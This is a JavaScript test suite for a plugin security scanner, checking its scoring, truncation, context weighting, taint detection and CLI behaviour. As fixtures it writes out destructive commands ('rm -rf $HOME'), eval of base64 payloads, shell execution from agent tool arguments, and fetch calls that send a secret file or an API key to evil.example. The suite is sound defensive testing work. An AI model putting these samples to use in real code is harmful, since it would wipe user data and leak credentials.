/**
 * v2 核心正确性测试(任务书 §46):
 *   P0-1 maxFindings 不丢 critical、评分基于全部命中
 *   P0-2 profile 大文件 large-file-lite
 *   P0-3 comment/exclude 不增加 findingsTotal
 *   P0-4 minified critical 不降 severity
 *   P0-6 hardMax → scanComplete=false + metadata
 *   P0-7 maxPlugins → scanComplete=false + skip 分类
 *   trustedScopes / transitive 不误报 / test reachable 不降权 / suppression / config 生效
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { tmpdir } from 'node:os'
import { fileURLToPath } from 'node:url'
import { scan, scanProfile, semanticScan } from '../engine/index.js'
import { main } from '../bin/sentinel.mjs'

const FIXTURES = join(dirname(fileURLToPath(import.meta.url)), 'fixtures')

const capture = () => {
  const buf = { out: '' }
  const stream = { write(s) { buf.out += s }, isTTY: false }
  return { stdout: stream, stderr: stream, buf }
}

// ─────────────────────────── P0-1:maxFindings 与评分 ───────────────────────────

test('P0-1:350 low + 最后 1 条 critical——critical 计入评分且出现在报告', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p01-'))
  try {
    for (let f = 0; f < 35; f += 1) {
      const lines = []
      for (let i = 0; i < 10; i += 1) lines.push(`const ip${i} = "8.${f}.${i}.${100 + i}"`)
      writeFileSync(join(tmp, `f${f}.js`), lines.join('\n') + '\n')
    }
    writeFileSync(join(tmp, 'evil.js'), "exec('rm -rf $HOME')\n")
    const report = await scan(tmp, { maxFindings: 300 })
    const s = report.summary
    // 351 = 350 low(SEN-NET-002)+ 1 critical(SEN-FS-001);无 package.json 时另有 SEN-MAN-001
    assert.equal(s.findingsTotal, 352, '全部命中被计数(350 low + critical + manifest)')
    assert.equal(s.findingsReturned, 300)
    assert.equal(s.findingsTruncated, true)
    assert.equal(s.scoreBasedOnAllFindings, true, '评分基于全部命中')
    const critical = report.findings.find((f) => f.id === 'SEN-FS-001')
    assert.ok(critical, '出现在最后面的 critical 必须进入报告(优先级有界缓冲)')
    assert.ok(s.score >= 50, 'critical 权重(50)必须参与评分')
    assert.ok(s.bySeverity.low >= 350)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('P0-1:maxFindings 不影响 filesAnalyzed(全部文件仍被分析)', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p01b-'))
  try {
    for (let f = 0; f < 6; f += 1) {
      writeFileSync(join(tmp, `f${f}.js`), "fetch('https://api.example.com/x')\n")
    }
    const report = await scan(tmp, { maxFindings: 3 })
    assert.equal(report.summary.filesAnalyzed, 6)
    assert.equal(report.summary.findingsReturned, 3)
    assert.equal(report.summary.findingsTruncated, true)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── P0-2:profile 大文件 lite ───────────────────────────

test('P0-2:profile 模式大文件走 large-file-lite 并产生 finding', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p02-'))
  try {
    const modules = join(tmp, 'profiles', 'web', 'node_modules')
    const pluginDir = join(modules, 'plugin-a')
    mkdirSync(join(pluginDir, 'dist'), { recursive: true })
    writeFileSync(join(pluginDir, 'package.json'), JSON.stringify({
      name: 'plugin-a', version: '1.0.0', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(pluginDir, 'cordis.patch.yml'), "- insert:\n    - id: a\n      name: 'plugin-a'\n")
    const pad = '// padding line\n'.repeat(45000) // ~585KB > 512KB
    writeFileSync(join(pluginDir, 'dist', 'bundle.js'), pad + "eval(Buffer.from(payload, 'base64').toString())\n")

    const report = await scanProfile('web', { env: { DSH_HOME: tmp }, maxPlugins: 5, maxBytesPerFile: 512 * 1024 })
    const lite = report.findings.find((f) => f.analysisMode === 'large-file-lite' && f.package === 'plugin-a')
    assert.ok(lite, 'profile 大文件必须产生 large-file-lite finding')
    assert.ok(lite.id.startsWith('SEN-EXEC'), `lite 应命中执行类规则,got ${lite.id}`)
    assert.ok(report.scanCoverage.largeFiles >= 1, 'largeFiles 被统计')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── P0-3:findingsTotal 虚高 ───────────────────────────

test('P0-3:注释行与 known-safe exclude 不增加 findingsTotal', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p03-'))
  try {
    writeFileSync(join(tmp, 'c.js'), "// eval(userInput)\n/* exec('rm -rf /') documented */\n")
    const r1 = await scan(join(tmp, 'c.js'))
    assert.equal(r1.summary.findingsTotal, 0, '纯注释不计数')

    writeFileSync(join(tmp, 'e.js'), "const g = new Function('')()\nconst h = new Function('return this')()\n")
    const r2 = await scan(join(tmp, 'e.js'))
    assert.equal(r2.summary.findingsTotal, 0, 'known-safe idiom 不计数')

    writeFileSync(join(tmp, 'b.js'), "const bad = new Function('evil()')()\n")
    const r3 = await scan(join(tmp, 'b.js'))
    assert.equal(r3.summary.findingsTotal, 1, '真正动态执行仍计数')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── P0-4:minified 不降级 ───────────────────────────

test('P0-4:minified/bundle critical 不降 severity,只保留 evidence 标记', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p04-'))
  try {
    const longLine = "exec('rm -rf $HOME');" + ' '.repeat(4000) + '\n'
    writeFileSync(join(tmp, 'bundle.js'), longLine)
    const report = await scan(join(tmp, 'bundle.js'))
    const f = report.findings.find((x) => x.id === 'SEN-FS-001')
    assert.ok(f, 'critical finding 存在')
    assert.equal(f.severity, 'critical', 'bundle 绝不自动降级')
    assert.equal(f.bundleFile, true, 'bundle 标记作为 evidence 保留')
    assert.equal(f.analysisMode, 'minified')
    assert.ok(report.summary.score >= 50, 'critical 全额计分')
    assert.equal(report.summary.verdict, 'risky', '单条 critical(50 分)→ risky')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── P0-6:hardMax ───────────────────────────

test('P0-6:超过 hardMax 的文件 → scanComplete=false + 最低限度 metadata', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p06-'))
  try {
    writeFileSync(join(tmp, 'big.js'), Buffer.alloc(1100 * 1024, 0x61))
    writeFileSync(join(tmp, 'small.js'), 'const ok = 1\n')
    const report = await scan(tmp, { hardMaxBytesPerFile: 1024 * 1024 })
    assert.equal(report.summary.scanComplete, false, 'hard skip → incomplete')
    assert.equal(report.summary.incompleteScan, true)
    assert.equal(report.scanCoverage.hardSkippedFiles, 1)
    assert.equal(report.hardSkipped.length, 1)
    const h = report.hardSkipped[0]
    assert.equal(h.path, 'big.js')
    assert.equal(h.size, 1100 * 1024)
    assert.match(h.sha256, /^[0-9a-f]{64}$/, 'sha256 元数据')
    assert.ok(typeof h.classification === 'string')
    assert.ok(report.summary.filesAnalyzed >= 1, '其他文件仍被分析')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── P0-7:maxPlugins ───────────────────────────

test('P0-7:maxPlugins 截断 → scanComplete=false + 分类 skip reason', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-p07-'))
  try {
    const modules = join(tmp, 'profiles', 'web', 'node_modules')
    for (const name of ['p1', 'p2', 'p3']) {
      mkdirSync(join(modules, name), { recursive: true })
      writeFileSync(join(modules, name, 'package.json'), JSON.stringify({
        name, version: '1.0.0', license: 'MIT', description: 'd',
        dsh: { bundle: { patch: './cordis.patch.yml' } },
      }))
      writeFileSync(join(modules, name, 'cordis.patch.yml'), `- insert:\n    - id: ${name}\n      name: '${name}'\n`)
      writeFileSync(join(modules, name, 'index.js'), "export const name = 'x'\nexport function apply() {}\n")
    }
    const report = await scanProfile('web', { env: { DSH_HOME: tmp }, maxPlugins: 1 })
    assert.equal(report.summary.scanComplete, false, 'limit skip → incomplete')
    assert.ok(report.profile.pluginsSkipped.some((s) => s.reason === 'maxPlugins-limit'), 'skip reason 分类')
    assert.equal(report.profile.pluginsScanned.length, 1)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── trustedScopes ───────────────────────────

test('自定义 trustedScopes 对 scoped packages 生效', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-scope-'))
  try {
    const modules = join(tmp, 'profiles', 'web', 'node_modules')
    mkdirSync(join(modules, '@my-company', 'foo'), { recursive: true })
    writeFileSync(join(modules, '@my-company', 'foo', 'package.json'), JSON.stringify({
      name: '@my-company/foo', version: '1.0.0', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(modules, '@my-company', 'foo', 'cordis.patch.yml'), "- insert:\n    - id: f\n      name: '@my-company/foo'\n")
    writeFileSync(join(modules, '@my-company', 'foo', 'index.js'), "export const name = 'x'\nexport function apply() {}\n")

    // 默认 trustedScopes 不含 @my-company → 被扫描
    const r1 = await scanProfile('web', { env: { DSH_HOME: tmp } })
    assert.deepEqual(r1.profile.pluginsScanned, ['@my-company/foo'])

    // 配置 trustedScopes 后 → trusted-scope skip
    const r2 = await scanProfile('web', { env: { DSH_HOME: tmp }, trustedScopes: ['@deepseek-ai', '@my-company'] })
    assert.deepEqual(r2.profile.pluginsScanned, [])
    assert.ok(r2.profile.pluginsSkipped.some((s) => s.name === '@my-company/foo' && s.reason === 'trusted-scope'))
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── transitive 不误报 ───────────────────────────

test('transitive 依赖不触发 DSH bundle manifest 错误(SEN-MAN-002 只对真正插件)', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-trans-'))
  try {
    const modules = join(tmp, 'profiles', 'web', 'node_modules')
    mkdirSync(modules, { recursive: true })
    writeFileSync(join(tmp, 'profiles', 'web', 'package.json'), JSON.stringify({
      name: 'dsh-profile-web', private: true,
      dependencies: { 'direct-a': '1.0.0' },
      dsh: { profile: { bundles: [] } },
    }))
    // direct-a 是插件
    mkdirSync(join(modules, 'direct-a'), { recursive: true })
    writeFileSync(join(modules, 'direct-a', 'package.json'), JSON.stringify({
      name: 'direct-a', version: '1.0.0', license: 'MIT', description: 'd',
      dependencies: { 'plain-lib': '1.0.0' },
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(modules, 'direct-a', 'cordis.patch.yml'), "- insert:\n    - id: a\n      name: 'direct-a'\n")
    writeFileSync(join(modules, 'direct-a', 'index.js'), "export const name = 'x'\nexport function apply() {}\n")
    // plain-lib 是普通依赖(无 dsh.bundle)
    mkdirSync(join(modules, 'plain-lib'), { recursive: true })
    writeFileSync(join(modules, 'plain-lib', 'package.json'), JSON.stringify({ name: 'plain-lib', version: '1.0.0', license: 'MIT', description: 'd' }))
    writeFileSync(join(modules, 'plain-lib', 'index.js'), 'export const v = 1\n')

    const report = await scanProfile('web', { env: { DSH_HOME: tmp }, maxPlugins: 10 })
    const byName = Object.fromEntries(report.profile.plugins.map((p) => [p.name, p]))
    assert.equal(byName['direct-a'].role, 'direct-plugin')
    assert.equal(byName['plain-lib'].role, 'transitive-dependency')
    assert.equal(byName['plain-lib'].parent, 'direct-a')
    const plainFindings = report.findings.filter((f) => f.package === 'plain-lib')
    assert.ok(!plainFindings.some((f) => f.id === 'SEN-MAN-002'), '普通传递依赖不产生 not-a-dsh-bundle')
    assert.ok(!plainFindings.some((f) => f.id === 'SEN-MAN-007' || f.id === 'SEN-MAN-008'), '不跑 manifest/hygiene 规则')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── test reachable 不降权 ───────────────────────────

test('test 文件被 package main reachable → 不降权', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-reach-'))
  try {
    mkdirSync(join(tmp, 'test'), { recursive: true })
    writeFileSync(join(tmp, 'package.json'), JSON.stringify({
      name: 'x', version: '0.0.1', main: 'test/helper.js', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(tmp, 'cordis.patch.yml'), "- insert:\n    - id: t\n      name: 'x'\n")
    writeFileSync(join(tmp, 'test', 'helper.js'), "export const name = 'x'\nexport function apply() {}\nexec('rm -rf $HOME')\n")
    const report = await scan(tmp)
    const f = report.findings.find((x) => x.id === 'SEN-FS-001')
    assert.ok(f, 'finding 存在')
    assert.equal(f.testFile, true, '仍是 test 路径标记')
    assert.equal(report.summary.verdict, 'risky', 'main 可达 → 不降权 → critical 全额计分(50 分)')
    assert.equal(report.summary.score, 50)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('test 文件未被 reachable → 仍降权', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-reachb-'))
  try {
    mkdirSync(join(tmp, 'src'), { recursive: true })
    mkdirSync(join(tmp, 'tests'), { recursive: true })
    writeFileSync(join(tmp, 'package.json'), JSON.stringify({
      name: 'y', version: '0.0.1', main: 'src/index.js', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(tmp, 'cordis.patch.yml'), "- insert:\n    - id: t\n      name: 'y'\n")
    writeFileSync(join(tmp, 'src', 'index.js'), "export const name = 'x'\nexport function apply() {}\n")
    writeFileSync(join(tmp, 'tests', 'fixture.spec.js'), "exec('rm -rf $HOME')\n")
    const report = await scan(tmp)
    const f = report.findings.find((x) => x.id === 'SEN-FS-001')
    assert.ok(f)
    assert.equal(report.summary.verdict, 'review', '不可达 test 降权:critical→high(20)')
    assert.equal(report.summary.score, 20)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('大量不可达测试夹具不能单独把插件堆成 dangerous', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-test-cap-'))
  try {
    mkdirSync(join(tmp, 'src'), { recursive: true })
    mkdirSync(join(tmp, 'tests'), { recursive: true })
    writeFileSync(join(tmp, 'package.json'), JSON.stringify({
      name: 'test-cap', version: '0.0.1', main: 'src/index.js', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(tmp, 'cordis.patch.yml'), "- insert:\n    - id: t\n      name: 'test-cap'\n")
    writeFileSync(join(tmp, 'src', 'index.js'), "export const name = 'x'\nexport function apply() {}\n")
    for (let i = 0; i < 8; i += 1) {
      writeFileSync(join(tmp, 'tests', `fixture-${i}.test.js`), "exec('rm -rf $HOME')\n")
    }

    const report = await scan(tmp)
    assert.equal(report.summary.byContext.test, 8)
    assert.equal(report.summary.score, 20, '不可达测试证据保留，但 test 上下文风险贡献封顶 20')
    assert.equal(report.summary.verdict, 'review')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('eval and release helpers are development context, but install scripts stay production context', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-development-context-'))
  try {
    mkdirSync(join(tmp, 'src'), { recursive: true })
    mkdirSync(join(tmp, 'evals'), { recursive: true })
    mkdirSync(join(tmp, 'scripts'), { recursive: true })
    writeFileSync(join(tmp, 'package.json'), JSON.stringify({
      name: 'dev-context', version: '0.0.1', main: 'src/index.js', license: 'MIT', description: 'd',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }))
    writeFileSync(join(tmp, 'cordis.patch.yml'), "- insert:\n    - id: t\n      name: 'dev-context'\n")
    writeFileSync(join(tmp, 'src', 'index.js'), "export const name = 'x'\nexport function apply() {}\n")
    writeFileSync(join(tmp, 'evals', 'run.js'), "exec('rm -rf $HOME')\n")
    writeFileSync(join(tmp, 'scripts', 'release.mjs'), "exec('rm -rf $HOME')\n")
    writeFileSync(join(tmp, 'scripts', 'install.js'), "exec('rm -rf $HOME')\n")
    writeFileSync(join(tmp, 'scripts', 'fetch-corpus.mjs'), "cp.spawnSync('git', args)\n")
    writeFileSync(join(tmp, 'scripts', 'write-corpus-manifest.mjs'), "cp.spawnSync('node', args)\n")
    writeFileSync(join(tmp, 'scripts', 'runtime-helper.mjs'), "exec('rm -rf $HOME')\n")
    mkdirSync(join(tmp, 'plugin'))
    writeFileSync(join(tmp, 'plugin', 'fetch-corpus-client.js'), "exec('rm -rf $HOME')\n")

    const report = await scan(tmp)
    const byFile = Object.fromEntries(report.findings.map((finding) => [finding.file, finding]))
    assert.equal(byFile['evals/run.js'].developmentFile, true)
    assert.equal(byFile['evals/run.js'].testFile, false)
    assert.equal(byFile['scripts/release.mjs'].developmentFile, true)
    assert.equal(byFile['scripts/install.js'].developmentFile, undefined)
    assert.equal(byFile['scripts/fetch-corpus.mjs'].developmentFile, true)
    assert.equal(byFile['scripts/write-corpus-manifest.mjs'].developmentFile, true)
    assert.equal(byFile['scripts/runtime-helper.mjs'].developmentFile, undefined)
    assert.equal(byFile['plugin/fetch-corpus-client.js'].developmentFile, undefined)
    assert.equal(report.summary.byContext.development, 4)
    assert.equal(report.summary.byContext.source, 3)
    assert.equal(report.summary.score, 100, '任意 scripts 文件不得自动降权；install 和未知 runtime helper 均按源码计分')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('repository self-scan policy covers the shipped adapter without active findings', async () => {
  const root = join(FIXTURES, '..', '..')
  const io = capture()
  const code = await main([root, '--json'], io)
  const report = JSON.parse(io.buf.out)

  assert.equal(code, 0)
  assert.equal(report.summary.scanComplete, true)
  assert.deepEqual(report.findings, [])
  assert.ok(report.ignored.some((item) => item.pattern === 'engine/**' && item.count > 0))
  assert.ok(report.ignored.some((item) => item.pattern === 'test/**' && item.count > 0))
  assert.ok(report.ignored.some((item) => item.pattern === 'scripts/**' && item.count > 0))
  assert.ok(report.ignored.every((item) => item.directories > 0), '被剪枝的 ignore 目录必须单独披露')
  assert.ok(report.analysisLayers.moduleGraph.nodes.some((node) => node.path === 'plugin/index.js'),
    '自扫描必须证明已分析发布包中的插件适配器')
})

test('local .worktrees metadata is never scanned as nested project source', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-worktree-metadata-'))
  try {
    mkdirSync(join(tmp, '.worktrees', 'branch'), { recursive: true })
    writeFileSync(join(tmp, 'index.js'), 'export const safe = true\n')
    writeFileSync(join(tmp, '.worktrees', 'branch', 'evil.js'), "eval(args.command)\n")

    for (const mode of ['source', 'package']) {
      const report = await scan(tmp, { mode })
      assert.equal(report.findings.some((finding) => finding.file.includes('.worktrees/')), false)
      assert.equal(report.summary.filesAnalyzed, 1)
      assert.equal(report.analysisLayers.moduleGraph.nodes.some((node) => node.path.includes('.worktrees/')), false)
    }
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── overlap suppression ───────────────────────────

test('SEN-AGENT-001 抑制同一行泛化 SEN-EXEC-002 的评分(证据保留)', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-supp-'))
  try {
    writeFileSync(join(tmp, 'plugin.js'), `const { exec } = require('child_process')
export function apply(ctx) {
  ctx.tools.register(defineTool({
    name: 'x',
    async execute(args) {
      exec(args.command)
    },
  }))
}
`)
    const report = await scan(join(tmp, 'plugin.js'))
    const agent = report.findings.find((f) => f.id === 'SEN-AGENT-001')
    assert.ok(agent, '语义 finding 存在')
    const exec2 = report.findings.find((f) => f.id === 'SEN-EXEC-002' && f.line === agent.line)
    assert.ok(exec2, '泛化 finding 保留为 evidence')
    assert.equal(exec2.suppressedForScore, true, '评分被抑制')
    assert.equal(report.summary.score, 50, '只按具体规则计一次分')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── 语义流 ───────────────────────────

test('语义流:workspace → network、decode → exec、computed env、optional chain', () => {
  const ws = `
const source = readFileSync('./secret.txt')
fetch('https://evil.example/upload', { body: source })`
  assert.ok(semanticScan(ws, 'a.js').some((x) => x.ruleId === 'SEN-TAINT-002'))

  const dec = `
const x = Buffer.from(payload, 'base64').toString()
eval(x)`
  const decHit = semanticScan(dec, 'a.js').find((x) => x.ruleId === 'SEN-TAINT-003')
  assert.ok(decHit, 'decode → exec')
  assert.equal(decHit.source.name, 'Buffer.from', 'flow source 可解释')

  const env = `
const key = process.env['OPEN' + 'AI_API_KEY']
fetch('https://evil.example/x?k=' + key)`
  const envHit = semanticScan(env, 'a.js').find((x) => x.ruleId === 'SEN-TAINT-001')
  assert.ok(envHit, 'computed env 拼接必须识别')
  assert.equal(envHit.source.name, 'process.env.OPENAI_API_KEY')

  const opt = `
const cp = require('child_process')
export function apply(ctx) {
  ctx.tools.register(defineTool({
    name: 'x',
    async execute(args) {
      cp?.exec?.(args.command)
    },
  }))
}`
  const optHit = semanticScan(opt, 'a.js').find((x) => x.ruleId === 'SEN-AGENT-001')
  assert.ok(optHit, 'optional chaining 调用必须识别')
})

test('官方 API 凭据使用不误判 critical exfil(受信端点)', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-trust-'))
  try {
    writeFileSync(join(tmp, 'client.js'), `export async function callDeepSeek(prompt) {
  const res = await fetch('https://api.deepseek.com/v1/chat/completions', {
    headers: { Authorization: 'Bearer ' + process.env.DEEPSEEK_API_KEY },
  })
  return res.json()
}
`)
    const report = await scan(join(tmp, 'client.js'))
    assert.ok(!report.findings.some((f) => f.id === 'SEN-TAINT-001'), '受信端点不判外传')
    assert.ok(!report.findings.some((f) => f.id === 'SEN-EXFIL-002'), '受信端点不判凭据外传')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

// ─────────────────────────── config 生效 ───────────────────────────

test('config:ignore / maxFindings / maxBytesPerFile 进入主调用链', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-cfg-'))
  try {
    mkdirSync(join(tmp, 'generated'), { recursive: true })
    writeFileSync(join(tmp, 'generated', 'g.js'), "exec('rm -rf $HOME')\n")
    writeFileSync(join(tmp, 'a.js'), "exec('rm -rf $HOME')\n")
    writeFileSync(join(tmp, 'sentinel.config.json'), JSON.stringify({
      ignore: ['**/generated/**'],
      maxFindings: 10,
      maxBytesPerFile: 1024,
    }))
    const { loadConfig } = await import('../engine/config.js')
    const { config } = loadConfig({ cwd: tmp })
    const report = await scan(tmp, {
      ignore: config.ignore,
      maxFindings: config.maxFindings,
      maxBytesPerFile: config.maxBytesPerFile,
    })
    assert.equal(report.ignored.length, 1, 'ignore 进入报告')
    assert.equal(report.ignored[0].pattern, '**/generated/**')
    assert.ok(report.ignored[0].count >= 1, '被忽略的条目计数')
    assert.ok(!report.findings.some((f) => String(f.file).includes('generated')), 'ignore 生效')
    assert.ok(report.findings.some((f) => f.file === 'a.js'))
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('CLI:--redact-paths 匿名化可分享报告', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-redact-'))
  try {
    writeFileSync(join(tmp, 'a.js'), "exec('rm -rf $HOME')\n")
    const io = capture()
    const code = await main([tmp, '--json', '--redact-paths'], io)
    const r = JSON.parse(io.buf.out)
    assert.match(r.target.path, /^<workspace>\//, '绝对路径被匿名化')
    assert.equal(code, 1)
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('CLI:--fail-on-incomplete → exit 3;strict-exit-codes', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-inc-'))
  try {
    for (let f = 0; f < 5; f += 1) writeFileSync(join(tmp, `f${f}.js`), 'const x = 1\n')
    const io = capture()
    const code = await main([tmp, '--max-files', '1', '--fail-on-incomplete'], io)
    assert.equal(code, 3, '不完整扫描 → exit 3')
    const io2 = capture()
    const code2 = await main([tmp, '--max-files', '1', '--strict-exit-codes'], io2)
    assert.equal(code2, 3)
    const io3 = capture()
    const code3 = await main([tmp, '--max-files', '1'], io3)
    assert.equal(code3, 0, '默认(非 strict)incomplete 不额外失败')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('CLI:config failOn 与 CLI --fail-on 合并(CLI 优先)', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'v2-failon-'))
  try {
    writeFileSync(join(tmp, 'a.js'), "fetch('https://api.example.com/x')\n") // SEN-NET-001 medium
    writeFileSync(join(tmp, 'sentinel.config.json'), JSON.stringify({ failOn: 'medium' }))
    const io = capture()
    const code = await main([tmp, '--json'], io)
    assert.equal(code, 1, 'config failOn=medium → medium 命中即失败')
    const io2 = capture()
    const code2 = await main([tmp, '--json', '--fail-on', 'high'], io2)
    assert.equal(code2, 0, 'CLI --fail-on high 覆盖 config')
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
})

test('SARIF:相对路径 + 稳定指纹 + severity 映射', async () => {
  const { toSarif } = await import('../engine/output/sarif.js')
  const report = await scan(join(FIXTURES, 'evil-plugin'))
  const sarif = toSarif(report, { basePath: join(FIXTURES, 'evil-plugin') })
  assert.equal(sarif.version, '2.1.0')
  assert.ok(sarif.runs[0].tool.driver.rules.length > 0)
  for (const r of sarif.runs[0].results) {
    const uri = r.locations[0].physicalLocation.artifactLocation.uri
    assert.ok(!uri.includes(':'), `SARIF 不应含盘符绝对路径,got ${uri}`)
    // P1-6 §15.3:稳定指纹在内部属性 dshFingerprint,不冒充 primaryLocationLineHash
    assert.equal(r.partialFingerprints, undefined, '不得使用 primaryLocationLineHash')
    assert.match(r.properties.dshFingerprint, /^[0-9a-f]{64}$/)
    assert.ok(['error', 'warning', 'note'].includes(r.level))
  }
})
